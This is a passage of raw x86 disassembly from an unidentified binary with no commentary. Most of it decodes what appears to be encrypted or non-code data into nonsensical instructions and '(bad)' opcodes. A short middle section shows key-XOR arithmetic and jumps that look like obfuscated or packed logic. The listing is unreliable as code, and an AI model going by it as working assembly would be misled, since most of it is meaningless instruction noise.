  4115cb:	cli    
  4115cc:	dec    edx
  4115cd:	push   edi
  4115ce:	or     DWORD PTR [esi-0x64d4f152],edi
  4115d4:	stc    
  4115d5:	(bad)  
  4115d6:	cmp    dh,BYTE PTR [edi+0x5150b349]
  4115dc:	cdq    
  4115dd:	sahf   
  4115de:	push   esi
  4115df:	mov    BYTE PTR [edx-0xcfcbb2d],bl
  4115e5:	sbb    dh,BYTE PTR [esi-0x7b]
  4115e8:	test   al,0x33
  4115ea:	sub    al,0xe2
  4115ec:	aas    
  4115ed:	cwde   
  4115ee:	push   ss
  4115ef:	or     DWORD PTR [ecx+0x1c],edi
  4115f2:	mov    esp,0xcdb09ade
  4115f7:	xlat   BYTE PTR ds:[ebx]
  4115f8:	mov    eax,0x59ac7c87
  4115fd:	nop
  4115fe:	jns    0x411586
  411600:	xchg   esp,eax
  411601:	inc    ebx
  411602:	lock and ebp,eax
  411605:	pop    ecx
  411606:	(bad)  
  411607:	mov    ecx,0xc9f92bc0
  41160c:	jl     0x4115be
  41160e:	mov    edx,0xa6604b44
  411613:	fadd   DWORD PTR [ebx+0x4451d853]
  411619:	inc    esp
  41161a:	(bad)  
  41161b:	aad    0x6a
  41161d:	and    eax,DWORD PTR [eax]
  41161f:	out    0x73,al
  411621:	popa   
  411622:	mov    BYTE PTR [eax-0x11b902db],dl
  411628:	fsubr  st(7),st
  41162a:	dec    esp
  41162b:	dec    edx
  41162c:	mov    al,ds:0x2cfc65bc
  411631:	push   ebp
  411632:	sbb    al,0x8a
  411634:	mov    ecx,0xf150b6a7
  411639:	pop    ecx
  41163a:	clc    
  41163b:	shl    BYTE PTR [eax],1
  41163d:	cdq    
  41163e:	cld    
  41163f:	jbe    0x411646
  411641:	(bad)  
  411642:	dec    edx
  411643:	sbb    al,0x4f
  411645:	xor    al,0x19
  411647:	jno    0x41165a
  411649:	or     dh,BYTE PTR [edx-0x65]
  41164c:	mov    edx,0x3718816c
  411651:	xchg   ecx,eax
  411652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411653:	test   BYTE PTR [esi],bh
  411655:	add    eax,0xe5f3f1c2
  41165a:	pop    ebx
  41165b:	(bad)  
  41165d:	shl    BYTE PTR [eax],0x70
  411660:	push   eax
  411661:	push   0x2a
  411663:	cmp    ecx,eax
  411665:	outs   dx,DWORD PTR ds:[esi]
  411666:	mov    ch,0xff
  411668:	(bad)  
  41166a:	ins    DWORD PTR es:[edi],dx
  41166b:	retf   
  41166c:	pop    DWORD PTR [ecx]
  41166e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41166f:	mov    bh,0x11
  411671:	cli    
  411672:	in     eax,0xf3
  411674:	fwait
  411675:	dec    DWORD PTR [esi]
  411677:	mov    ds:0x8877482c,al
  41167c:	int    0xd2
  41167e:	jno    0x41167c
  411680:	push   eax
  411681:	fistp  WORD PTR [esi]
  411683:	out    dx,eax
  411684:	push   edx
  411685:	and    DWORD PTR [eax+0x2c],ebp
  411688:	stc    
  411689:	stos   BYTE PTR es:[edi],al
  41168a:	jecxz  0x411681
  41168c:	adc    eax,0xdd110861
  411691:	push   esp
  411692:	sub    DWORD PTR [ecx+eax*8],edi
  411695:	inc    esp
  411696:	imul   eax,ecx,0x7b290ba0
  41169c:	fisubr WORD PTR [ecx+0x5c]
  41169f:	jno    0x4116f5
  4116a1:	ja     0x4116dd
  4116a3:	jl     0x41162d
  4116a5:	repnz and esi,ebx
  4116a8:	pop    esp
  4116a9:	pop    DWORD PTR [edx]
  4116ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ac:	xchg   edx,eax
  4116ad:	fcomip st,st(5)
  4116af:	xchg   edx,eax
  4116b0:	rcr    DWORD PTR [ecx-0xadce68f],1
  4116b6:	rcr    DWORD PTR [esi],1
  4116b8:	addr16 mov ah,0x90
  4116bb:	fistp  DWORD PTR ds:0x9e59bb09
  4116c1:	sti    
  4116c2:	pop    edx
  4116c3:	xor    eax,0xd5ce4b3f
  4116c8:	arpl   bp,ax
  4116ca:	fistp  WORD PTR [eax]
  4116cc:	inc    esp
  4116cd:	pop    ss
  4116ce:	sbb    al,0x69
  4116d0:	push   ss
  4116d1:	pop    ebp
  4116d2:	mov    ah,dh
  4116d4:	inc    ebx
  4116d5:	adc    BYTE PTR [ebp-0xe],dl
  4116d8:	dec    ebp
  4116d9:	jo     0x4116fc
  4116db:	ins    DWORD PTR es:[edi],dx
  4116dc:	outs   dx,BYTE PTR ds:[esi]
  4116dd:	(bad)  
  4116de:	mov    esi,0x5b826179
  4116e3:	mov    edi,0x15437b6b
  4116e8:	call   0xd3ea1d04
  4116ed:	mov    cl,0x32
  4116ef:	sbb    bl,BYTE PTR [eax+0x63]
  4116f2:	fld    TBYTE PTR [ebp-0x419dbdb]
  4116f8:	jo     0x4116f6
  4116fa:	mov    DWORD PTR [ebp+0x74f95de3],edx
  411700:	ja     0x41172f
  411702:	mov    ch,0x1
  411704:	call   0x7d24:0xb2d4
  41170a:	jmp    0x757f:0xcd490360
  411711:	mov    cl,0xcd
  411713:	push   edi
  411714:	push   edx
  411715:	ror    BYTE PTR [edx],0xc2
  411718:	out    dx,al
  411719:	jno    0x4116bb
  41171b:	sbb    al,0x76
  41171d:	movups XMMWORD PTR [ebx+0x1584aab0],xmm2
  411724:	or     edi,DWORD PTR [edx-0x4]
  411727:	div    BYTE PTR [ebx+ebx*2-0x71]
  41172b:	mov    ch,0x7
  41172d:	mov    esp,0xee8cdfa
  411732:	mov    cl,BYTE PTR ds:0xf0155c53
  411738:	and    bh,dh
  41173a:	push   esp
  41173b:	adc    DWORD PTR [edi+0x346ddbf3],edi
  411741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411742:	xchg   DWORD PTR [ebx+0x3d],eax
  411745:	cmp    BYTE PTR [edi+0x147b87a3],dl
  41174b:	aad    0x18
  41174d:	lahf   
  41174e:	rcl    DWORD PTR [esi+esi*1+0x18],0x27
  411753:	adc    bl,BYTE PTR [ebx]
  411755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411756:	lahf   
  411757:	inc    eax
  411758:	dec    edi
  411759:	push   esi
  41175a:	dec    esi
  41175b:	push   0xffffffe5
  41175d:	sbb    dh,bl
  41175f:	fidiv  DWORD PTR [edi-0x48]
  411762:	inc    esi
  411763:	cmp    ebp,DWORD PTR [ebx]
  411765:	add    BYTE PTR [ecx+0x76],0xdf
  411769:	jo     0x411791
  41176b:	sub    BYTE PTR [ecx+0x3f],0xcb
  41176f:	xor    esp,0x78
  411772:	add    BYTE PTR [edx-0x4f02278f],bl
  411778:	inc    edx
  411779:	jbe    0x41172e
  41177b:	inc    ecx
  41177c:	in     al,dx
  41177d:	xor    cl,dl
  41177f:	(bad)  
  411780:	mov    eax,ds:0x9b887e8a
  411785:	shl    ch,0x30
  411788:	lods   eax,DWORD PTR ds:[esi]
  411789:	(bad)  
  41178a:	sub    eax,0x39a29e5d
  41178f:	xchg   esi,eax
  411790:	cmp    bh,dl
  411792:	cdq    
  411793:	sbb    al,0xd8
  411795:	in     eax,0x2c
  411797:	cs retf 0x5c78
  41179b:	push   ds
  41179c:	mov    esi,0x843b30a9
  4117a1:	mov    bl,0x65
  4117a3:	xchg   esp,eax
  4117a4:	mov    eax,0x40dfa527
  4117a9:	(bad)  
  4117aa:	pop    ds
  4117ab:	sbb    DWORD PTR [ecx-0x34],ecx
  4117ae:	pop    ecx
  4117af:	in     al,0x59
  4117b1:	push   0x36
  4117b3:	and    cl,dl
  4117b5:	push   es
  4117b6:	imul   ebp,DWORD PTR [edx+0x6a],0x596c1bc
  4117bd:	cmp    bh,BYTE PTR [ecx-0x8]
  4117c0:	mov    cl,0x94
  4117c2:	push   ebx
  4117c3:	shl    DWORD PTR [edx],0x55
  4117c6:	or     al,0xc6
  4117c8:	add    BYTE PTR [esi-0x55c6d61e],dl
  4117ce:	out    dx,eax
  4117cf:	mov    eax,ds:0x10efc7b5
  4117d4:	ret    0xe0f7
  4117d7:	inc    eax
  4117d8:	or     edi,0x4d
  4117db:	mov    edi,0x783b1372
  4117e0:	xchg   esi,eax
  4117e2:	out    0x39,al
  4117e4:	inc    eax
  4117e5:	fwait
  4117e6:	aas    
  4117e7:	ret    0x71ee
  4117ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117eb:	imul   edi,DWORD PTR [edx],0xdd038d28
  4117f1:	(bad)  
  4117f2:	mov    ecx,0xfcf32c9b
  4117f7:	pop    ecx
  4117f8:	pop    esi
  4117f9:	mov    ecx,0x1eb896b
  4117fe:	add    BYTE PTR [edx-0x59db88],0x4a
  411805:	adc    ebp,0xffffffbd
  411808:	xchg   esp,eax
  411809:	js     0x411880
  41180b:	lahf   
  41180c:	mov    ebx,0xc86b01b9
  411811:	dec    ebp
  411812:	stos   BYTE PTR es:[edi],al
  411813:	pop    es
  411814:	add    eax,0x484cec5c
  411819:	int    0xa9
  41181b:	or     eax,0x76772d4
  411820:	push   cs
  411821:	dec    esp
  411822:	or     BYTE PTR [eax+ebp*4-0x6754bb18],ch
  411829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41182a:	cmp    dh,cl
  41182c:	aam    0x7b
  41182e:	in     al,0x27
  411830:	mov    edi,ds
  411832:	sbb    ecx,DWORD PTR [ebx]
  411834:	add    BYTE PTR [edx-0x71],0x73
  411838:	xchg   edi,eax
  411839:	inc    eax
  41183b:	shl    BYTE PTR [edi-0x28],0x42
  41183f:	bound  esi,QWORD PTR [ebx-0xc2dc7ae]
  411845:	xor    cl,BYTE PTR [edi+edi*8+0x7]
  411849:	jne    0x4117ec
  41184b:	int3   
  41184c:	jns    0x4117f8
  41184e:	mov    ebx,0xd5d1a8a2
  411853:	dec    esi
  411854:	stos   DWORD PTR es:[edi],eax
  411855:	sub    bl,BYTE PTR [eax+0x381199b0]
  41185b:	loopne 0x411867
  41185d:	add    DWORD PTR [eax-0xef4fc44],edx
  411863:	pop    esi
  411864:	shr    cl,1
  411866:	mov    dh,0x8
  411868:	sbb    eax,0x32398602
  41186d:	ret    0xbd19
  411870:	adc    al,0x4d
  411872:	hlt    
  411873:	sti    
  411874:	adc    esp,0x9da517e2
  41187a:	not    BYTE PTR [esi]
  41187c:	retf   0x19f0
  41187f:	mov    dh,BYTE PTR [edx+0x72]
  411882:	adc    al,0xb6
  411884:	adc    al,0xb9
  411886:	xor    ebp,ebp
  411888:	xor    eax,DWORD PTR [ebp-0xf]
  41188b:	retf   
  41188c:	and    DWORD PTR [edi-0x7cef4b89],ebx
  411892:	sti    
  411893:	mov    ecx,DWORD PTR [esi+0x23a87e33]
  411899:	xchg   dh,dh
  41189b:	push   eax
  41189c:	mov    al,cl
  41189e:	push   ebx
  41189f:	cwde   
  4118a0:	test   BYTE PTR [edi+0x1652414b],bl
  4118a6:	and    edi,ebx
  4118a8:	pop    ds
  4118a9:	clc    
  4118aa:	ror    DWORD PTR [ebx-0x56],1
  4118ad:	mov    edi,fs
  4118af:	outs   dx,BYTE PTR ds:[esi]
  4118b0:	push   cs
  4118b1:	add    eax,0xc7abd4fb
  4118b6:	push   ss
  4118b7:	jg     0x4118ed
  4118b9:	cmc    
  4118ba:	daa    
  4118bb:	sub    edi,DWORD PTR ds:0xb6c3db49
  4118c1:	or     al,0x5f
  4118c3:	fcomip st,st(3)
  4118c5:	pushf  
  4118c6:	sub    DWORD PTR [edx-0x590e37e1],eax
  4118cc:	shl    DWORD PTR [ebx*4+0x32d8e794],1
  4118d3:	call   0xfe5c:0x9314b4f1
  4118da:	xchg   esp,eax
  4118db:	lock (bad) 
  4118dd:	ror    bh,0xb0
  4118e0:	sub    eax,0x54a14f7c
  4118e5:	mov    ch,0xe6
  4118e7:	inc    ebx
  4118e8:	test   eax,0xafe2e372
  4118ed:	adc    al,0x71
  4118ef:	and    ebx,DWORD PTR [edx]
  4118f1:	push   esi
  4118f2:	lock xor esp,DWORD PTR [eax+edi*4]
  4118f6:	jle    0x411953
  4118f8:	cmp    BYTE PTR [ebx+0x14],0x3e
  4118fc:	mov    esp,0x7e0faa2a
  411901:	(bad)  
  411903:	das    
  411904:	lahf   
  411905:	push   edx
  411906:	stos   BYTE PTR es:[edi],al
  411907:	out    dx,al
  411908:	push   ss
  411909:	jge    0x4118c0
  41190b:	pop    es
  41190c:	pop    ss
  41190d:	xor    eax,0x3f5d8205
  411912:	add    al,0x4e
  411914:	xchg   ebp,eax
  411915:	fs ret 
  411917:	inc    edi
  411918:	lfs    ebp,FWORD PTR [edi+0x387f5c50]
  41191f:	(bad)  
  411921:	inc    ecx
  411922:	rcr    DWORD PTR [eax],cl
  411924:	je     0x411923
  411926:	xor    al,0xf9
  411928:	(bad)  
  411929:	test   al,0xf0
  41192b:	hlt    
  41192c:	sbb    DWORD PTR [edx],edx
  41192e:	and    eax,0x3c5b38b2
  411933:	shl    ah,1
  411935:	(bad)  
  411936:	in     al,0x39
  411938:	mov    ebx,0x5d448a16
  41193d:	loopne 0x41197c
  41193f:	addr16 mov cl,0x3d
  411942:	mov    esp,esp
  411944:	inc    bl
  411946:	gs (bad) 
  411948:	nop
  411949:	jecxz  0x411947
  41194b:	sub    dh,BYTE PTR [ebp-0x7c]
  41194e:	outs   dx,DWORD PTR ds:[esi]
  41194f:	aad    0xda
  411951:	das    
  411952:	retf   
  411953:	in     al,0x49
  411955:	sub    ch,bh
  411957:	lock mov dl,0x1
  41195a:	lea    esi,[ebx]
  41195c:	(bad)  
  41195d:	dec    esp
  41195e:	ret    
  41195f:	and    al,0xed
  411961:	cmp    eax,0xa6b549ec
  411966:	(bad)  
  411967:	ds adc esp,ecx
  41196a:	sub    edx,edx
  41196c:	and    eax,edi
  41196e:	xor    ebx,esp
  411970:	jp     0x4119b5
  411972:	in     eax,0x45
  411974:	sbb    eax,0xa532b9a2
  411979:	(bad)  [edx]
  41197b:	push   es
  41197c:	cdq    
  41197d:	adc    al,0x7d
  41197f:	(bad)  
  411981:	pop    ss
  411982:	rcr    DWORD PTR [edi-0x4d],0xd3
  411986:	dec    ebp
  411987:	outs   dx,BYTE PTR ds:[esi]
  411988:	sti    
  411989:	inc    esp
  41198a:	and    al,0x59
  41198c:	dec    esi
  41198d:	retf   
  41198e:	cmc    
  41198f:	(bad)  [ebx]
  411991:	stos   DWORD PTR es:[edi],eax
  411992:	lods   eax,DWORD PTR ds:[esi]
  411993:	jmp    0x27fe0b21
  411998:	add    bh,BYTE PTR [edx+0x4]
  41199b:	arpl   bp,si
  41199d:	ret    0x792e
  4119a0:	lods   eax,DWORD PTR ds:[esi]
  4119a1:	ins    BYTE PTR es:[edi],dx
  4119a2:	popa   
  4119a3:	mov    bl,0x55
  4119a5:	hlt    
  4119a6:	sbb    bh,BYTE PTR [ebx+0x633cc220]
  4119ac:	dec    ebx
  4119ad:	pop    es
  4119ae:	mov    ebp,0x2635bb6b
  4119b3:	push   0xffffffd3
  4119b5:	sub    dh,BYTE PTR [ecx-0x10568de9]
  4119bb:	pop    eax
  4119bc:	stc    
  4119bd:	arpl   WORD PTR [edi],dx
  4119bf:	xchg   ecx,eax
  4119c0:	repnz inc esi
  4119c2:	push   edi
  4119c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119c4:	rcl    BYTE PTR [eax-0x5f310f66],1
  4119ca:	fs je  0x411a35
  4119cd:	aad    0x94
  4119cf:	ss aaa 
  4119d1:	cmp    DWORD PTR [eax+0x499212ab],0x1e
  4119d8:	sub    ecx,ecx
  4119da:	add    al,0x6
  4119dc:	mov    WORD PTR [eax-0x3afcfeef],fs
  4119e2:	rcl    BYTE PTR [eax-0x55],0x8b
  4119e6:	push   ebp
  4119e7:	mov    eax,0x64b1364
  4119ec:	fisttp QWORD PTR [ecx]
  4119ee:	or     al,0x23
  4119f0:	outs   dx,DWORD PTR ds:[esi]
  4119f1:	das    
  4119f2:	jo     0x411a02
  4119f4:	dec    edx
  4119f5:	jnp    0x4119b2
  4119f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119f8:	icebp  
  4119f9:	fst    QWORD PTR [edi]
  4119fb:	mov    esi,0x5327f891
  411a00:	aas    
  411a01:	lahf   
  411a02:	(bad)  
  411a03:	jb     0x4119a6
  411a05:	pop    ds
  411a06:	xchg   esi,eax
  411a07:	cmp    BYTE PTR [edi-0x74f7aa75],bl
  411a0d:	pop    ebp
  411a0e:	test   al,0x81
  411a10:	ret    0x8f8
  411a13:	push   edi
  411a14:	add    BYTE PTR [edi],cl
  411a16:	scas   eax,DWORD PTR es:[edi]
  411a17:	ror    DWORD PTR [ecx+0x558ba855],cl
  411a1d:	or     BYTE PTR [ebx-0x3d7e53a3],cl
  411a23:	(bad)  
  411a25:	add    BYTE PTR fs:[ebx],cl
  411a28:	ror    DWORD PTR [ecx+0x558bac55],cl
  411a2e:	or     BYTE PTR [ebx-0x2efc4fa3],cl
  411a34:	xor    edx,ebx
  411a36:	mov    DWORD PTR [ebp-0x50],edx
  411a39:	mov    edx,DWORD PTR [ebp+0x8]
  411a3c:	mov    ebx,DWORD PTR [ebp-0x4c]
  411a3f:	add    edx,edi
  411a41:	and    edx,ebx
  411a43:	mov    DWORD PTR [ebp-0x4c],edx
  411a46:	mov    edx,DWORD PTR [ebp+0x8]
  411a49:	mov    ebx,DWORD PTR [ebp-0x48]
  411a4c:	lea    edx,[ebx+edx*1+0x241fc1f]
  411a53:	mov    DWORD PTR [ebp-0x48],edx
  411a56:	mov    edx,DWORD PTR [ebp+0x8]
  411a59:	mov    ebx,0xfa5e15e2
  411a5e:	sub    ebx,edx
  411a60:	add    ebx,DWORD PTR [ebp-0x44]
  411a63:	mov    DWORD PTR [ebp-0x44],ebx
  411a66:	mov    edx,DWORD PTR [ebp+0x8]
  411a69:	xor    edx,eax
  411a6b:	add    edx,esi
  411a6d:	jne    0x40f670
  411a73:	mov    edx,DWORD PTR [ebp-0xc]
  411a76:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  411a7d:	mov    bl,BYTE PTR [ebp-0x1]
  411a80:	cmp    dl,bl
  411a82:	je     0x413ee6
  411a88:	mov    ecx,DWORD PTR [ebp-0x5c]
  411a8b:	mov    edx,DWORD PTR [ebp-0xc]
  411a8e:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  411a95:	mov    ebx,DWORD PTR [ebp+0xc]
  411a98:	xor    ecx,eax
  411a9a:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e0]
  411aa1:	jne    0x418726
  411aa7:	mov    ecx,DWORD PTR [ebp-0x5c]
  411aaa:	mov    edx,DWORD PTR [ebp+0xc]
  411aad:	xor    ecx,eax
  411aaf:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e0]
  411ab7:	mov    edx,DWORD PTR [ebp-0x18]
  411aba:	xor    edx,eax
  411abc:	add    edx,esi
  411abe:	cmp    ecx,edx
  411ac0:	mov    ecx,DWORD PTR [ebp-0x14]
  411ac3:	mov    DWORD PTR [ebp+0x8],ecx
  411ac6:	mov    ecx,DWORD PTR [ebp+0x8]
  411ac9:	je     0x41abb4
  411acf:	xor    ecx,eax
  411ad1:	add    ecx,esi
  411ad3:	mov    ecx,0x242ebed
  411ad8:	je     0x4162f4
  411ade:	mov    edx,DWORD PTR [ebp+0x8]
  411ae1:	mov    ebx,DWORD PTR [ebp-0x8]
  411ae4:	xor    edx,eax
  411ae6:	xor    ebx,eax
  411ae8:	sub    edx,ebx
  411aea:	sub    edx,esi
  411aec:	xor    edx,eax
  411aee:	mov    DWORD PTR [ebp+0x8],edx
  411af1:	mov    edx,DWORD PTR [ebp+0x8]
  411af4:	mov    ebx,DWORD PTR [ebp-0x58]
  411af7:	add    edx,0x5708f8
  411afd:	imul   edx,ebx
  411b00:	mov    DWORD PTR [ebp-0x58],edx
  411b03:	mov    edx,DWORD PTR [ebp+0x8]
  411b06:	mov    ebx,DWORD PTR [ebp-0x54]
  411b09:	add    edx,0x64f8da
  411b0f:	or     edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x54],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x50]
  411b1a:	add    edx,ecx
  411b1c:	xor    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x50],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b27:	add    edx,edi
  411b29:	and    edx,ebx
  411b2b:	mov    DWORD PTR [ebp-0x4c],edx
  411b2e:	mov    edx,DWORD PTR [ebp+0x8]
  411b31:	mov    ebx,DWORD PTR [ebp-0x48]
  411b34:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b3b:	mov    DWORD PTR [ebp-0x48],edx
  411b3e:	mov    edx,DWORD PTR [ebp+0x8]
  411b41:	mov    ebx,0xfa5e15e2
  411b46:	sub    ebx,edx
  411b48:	add    ebx,DWORD PTR [ebp-0x44]
  411b4b:	mov    DWORD PTR [ebp-0x44],ebx
  411b4e:	mov    edx,DWORD PTR [ebp+0x8]
  411b51:	xor    edx,eax
  411b53:	add    edx,esi
  411b55:	jne    0x411ade
  411b5b:	jmp    0x4162f4
  411b60:	jmp    0x413ee6
  411b65:	out    0x82,al
  411b67:	push   es
  411b68:	and    eax,0x81c5a506
  411b6d:	outs   dx,BYTE PTR ds:[esi]
  411b6e:	fs sub eax,0x7af2b1ed
  411b74:	(bad)  
  411b75:	cs scas al,BYTE PTR es:[edi]
  411b77:	jp     0x411bf3
  411b79:	add    DWORD PTR [edi+0x7a],ebx
  411b7c:	jp     0x411bf1
  411b7e:	add    DWORD PTR ds:0x39ad462c,edi
  411b84:	add    al,BYTE PTR [edi-0x25]
  411b87:	lea    ebx,ds:0xea056bf3
  411b8d:	adc    BYTE PTR [edi+esi*8],bl
  411b90:	icebp  
  411b91:	pusha  
  411b92:	or     ah,BYTE PTR [esi-0x15]
  411b95:	cmp    eax,0x611a272a
  411b9a:	cmp    DWORD PTR [esi+0x6da21434],ebp
  411ba0:	call   FWORD PTR [edx+0x4e]
  411ba3:	jns    0x411b3e
  411ba5:	push   esp
  411ba6:	push   0x3f
  411ba8:	jg     0x411bed
  411baa:	push   esp
  411bab:	mov    BYTE PTR [edi-0x18],bh
  411bae:	sbb    edi,DWORD PTR [ecx+eiz*2]
  411bb1:	sahf   
  411bb2:	cmp    ah,ch
  411bb4:	add    eax,0x83028728
  411bb9:	out    0x72,al
  411bbb:	cmp    ecx,DWORD PTR [ebx+0x76]
  411bbe:	leave  
  411bbf:	xchg   ebx,eax
  411bc0:	sahf   
  411bc1:	je     0x411c08
  411bc3:	rcl    DWORD PTR [ebx+esi*8+0x6e35b901],cl
  411bca:	sahf   
  411bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bcc:	pop    ecx
  411bcd:	in     al,dx
  411bce:	mov    ch,0x11
  411bd0:	xchg   ebx,eax
  411bd1:	ds inc eax
  411bd3:	test   BYTE PTR [eax+0x37],ch
  411bd6:	mov    dh,BYTE PTR [edx]
  411bd8:	pushf  
  411bd9:	jp     0x411bcc
  411bdb:	and    cl,BYTE PTR [ebx-0x4c]
  411bde:	mov    WORD PTR [ebp+eax*4+0x22406eae],gs
  411be5:	retf   0xb0ab
  411be8:	xor    esp,DWORD PTR [ebx-0x38]
  411beb:	jmp    0x684:0x7148e878
  411bf2:	fs addr16 je 0x411bc3
  411bf6:	(bad)  
  411bf7:	mov    ebp,0xc4567e32
  411bfc:	retf   
  411bfd:	fisubr DWORD PTR [eax+edi*2]
  411c00:	xlat   BYTE PTR ds:[ebx]
  411c01:	sub    eax,edi
  411c03:	push   edx
  411c04:	xor    esp,ecx
  411c06:	lahf   
  411c07:	jle    0x411bcc
  411c09:	sbb    BYTE PTR [esi+edi*2-0x4771c817],ch
  411c10:	stos   BYTE PTR es:[edi],al
  411c11:	shr    edi,0x31
  411c14:	or     BYTE PTR [eax+edx*2-0x2f],0xc4
  411c19:	(bad)  
  411c1a:	in     al,0xa3
  411c1c:	jnp    0x411c91
  411c1e:	retf   0xbee6
  411c21:	loop   0x411bee
  411c23:	lock call FWORD PTR [ecx]
  411c26:	jl     0x411c03
  411c28:	jb     0x411bb6
  411c2a:	(bad)  
  411c2b:	bound  ecx,QWORD PTR [edx]
  411c2d:	mov    dh,0xa6
  411c2f:	stos   BYTE PTR es:[edi],al
  411c30:	jbe    0x411c5a
  411c32:	nop    DWORD PTR [esi+0x29e8f69f]
  411c39:	test   eax,0x1890d359
  411c3e:	jg     0x411ca2
  411c40:	nop
  411c41:	inc    ebx
  411c42:	add    eax,DWORD PTR [edx]
  411c44:	push   ebp
  411c45:	dec    esi
  411c46:	dec    ebp
  411c47:	mov    edi,0xd3117682
  411c4c:	les    eax,FWORD PTR [ecx+esi*4]
  411c4f:	shl    BYTE PTR [edi+0x4c04b5aa],0xf2
  411c56:	xor    al,0xf5
  411c58:	dec    eax
  411c59:	pop    eax
  411c5a:	test   dh,0xa0
  411c5d:	fadd   DWORD PTR [ebx-0x72]
  411c60:	fcom   DWORD PTR [ebx]
  411c62:	mov    WORD PTR [esi-0x32],fs
  411c65:	(bad)  
  411c66:	lods   al,BYTE PTR ds:[esi]
  411c67:	icebp  
  411c68:	out    dx,eax
  411c69:	pop    esi
  411c6a:	in     al,0x67
  411c6c:	repnz mov ebp,DWORD PTR ss:[esi]
  411c70:	(bad)  
  411c71:	fisub  WORD PTR [ebx-0x45bfc975]
  411c77:	loop   0x411c3c
  411c79:	sub    DWORD PTR [ecx+eiz*8+0x9],esi
  411c7d:	ds ffree st(0)
  411c80:	into   
  411c81:	in     eax,0x3d
  411c83:	loope  0x411c25
  411c85:	mov    ah,0xa0
  411c87:	lds    ecx,FWORD PTR [ebx+0x573d8afb]
  411c8d:	pusha  
  411c8e:	mov    BYTE PTR [eax+ecx*1+0x2c],ch
  411c92:	xlat   BYTE PTR ds:[ebx]
  411c93:	popa   
  411c94:	stos   DWORD PTR es:[edi],eax
  411c95:	push   es
  411c96:	pop    ss
  411c97:	lea    ebx,[esi+0x63]
  411c9a:	loop   0x411c87
  411c9c:	and    BYTE PTR [ebp+0x19],bl
  411c9f:	sti    
  411ca0:	imul   ebx,eax,0x28
  411ca3:	out    0x85,eax
  411ca5:	xor    esi,ecx
  411ca7:	cmc    
  411ca8:	fdivr  QWORD PTR [esi+0x61]
  411cab:	ins    DWORD PTR es:[edi],dx
  411cac:	xor    BYTE PTR [edx-0xf826f7b],cl
  411cb2:	push   edx
  411cb3:	and    BYTE PTR [ebp-0x4c],bl
  411cb6:	sti    
  411cb7:	inc    eax
  411cb8:	jmp    0x411cf4
  411cba:	jmp    0xda83:0xfb279411
  411cc1:	jl     0x411c78
  411cc3:	mov    fs,WORD PTR [esi-0x68]
  411cc6:	std    
  411cc7:	fs jbe 0x411ceb
  411cca:	and    dl,BYTE PTR [ebp-0x7f5d7719]
  411cd0:	cwde   
  411cd1:	mov    ebx,0x8adbfc8b
  411cd6:	js     0x411c5d
  411cd8:	push   eax
  411cd9:	mov    edx,ebx
  411cdb:	cmp    BYTE PTR [edi-0x1d895f46],0xa7
  411ce2:	iret   
  411ce3:	push   esi
  411ce4:	mov    al,ds:0x1998d554
  411ce9:	pop    esp
  411cea:	leave  
  411ceb:	paddq  mm2,QWORD PTR [ebx+eiz*4]
  411cef:	sub    eax,0x9faa310e
  411cf4:	imul   esi,DWORD PTR [esi+eiz*8-0x2c796f4a],0x47
  411cfc:	pop    esi
  411cfd:	shr    BYTE PTR [edi],1
  411cff:	push   0xd93a2a6b
  411d04:	not    BYTE PTR [ecx+0x30]
  411d07:	out    0xfb,eax
  411d09:	pop    esp
  411d0a:	pusha  
  411d0b:	into   
  411d0c:	mov    ecx,0xb5b3a63
  411d11:	stos   DWORD PTR es:[edi],eax
  411d12:	push   edx
  411d13:	repnz add DWORD PTR [edi],ecx
  411d16:	cmp    BYTE PTR [esi],ah
  411d18:	jno    0x411ce0
  411d1a:	jg     0x411cd3
  411d1c:	imul   ebx,esi,0x4e
  411d1f:	inc    ecx
  411d20:	add    esp,edx
  411d22:	inc    edx
  411d23:	repz inc esi
  411d25:	call   0x9b769912
  411d2a:	xlat   BYTE PTR ds:[ebx]
  411d2b:	xor    DWORD PTR [esi],esp
  411d2d:	cmp    al,bh
  411d2f:	sbb    al,0x62
  411d31:	cmp    eax,0x1228212e
  411d36:	outs   dx,BYTE PTR gs:[esi]
  411d38:	pop    DWORD PTR [edi+0x5fd3eccb]
  411d3e:	xor    bh,BYTE PTR fs:[edi*1+0x626045f0]
  411d46:	ins    DWORD PTR es:[edi],dx
  411d47:	cdq    
  411d48:	call   0xada0bf3b
  411d4d:	test   eax,0x2b80abd4
  411d52:	push   ebp
  411d53:	and    cl,BYTE PTR [eax+0x64448520]
  411d59:	sahf   
  411d5a:	(bad)  
  411d5b:	cmp    bh,BYTE PTR [ebp-0x35]
  411d5e:	test   DWORD PTR [ebx+0x26],esp
  411d61:	(bad)  
  411d62:	out    dx,al
  411d63:	push   ecx
  411d64:	inc    esp
  411d65:	sub    eax,0x1fbddc60
  411d6a:	fcom   st(3)
  411d6c:	cdq    
  411d6d:	xchg   edx,eax
  411d6e:	cs xchg esp,eax
  411d70:	push   ds
  411d71:	cmp    BYTE PTR [eax],dh
  411d73:	enter  0xfcab,0x8e
  411d77:	adc    DWORD PTR [ebx],edx
  411d79:	push   eax
  411d7a:	xlat   BYTE PTR ds:[ebx]
  411d7b:	out    dx,eax
  411d7c:	daa    
  411d7d:	in     eax,dx
  411d7e:	mov    eax,ds:0xc0561162
  411d83:	icebp  
  411d84:	inc    ebx
  411d85:	inc    ebx
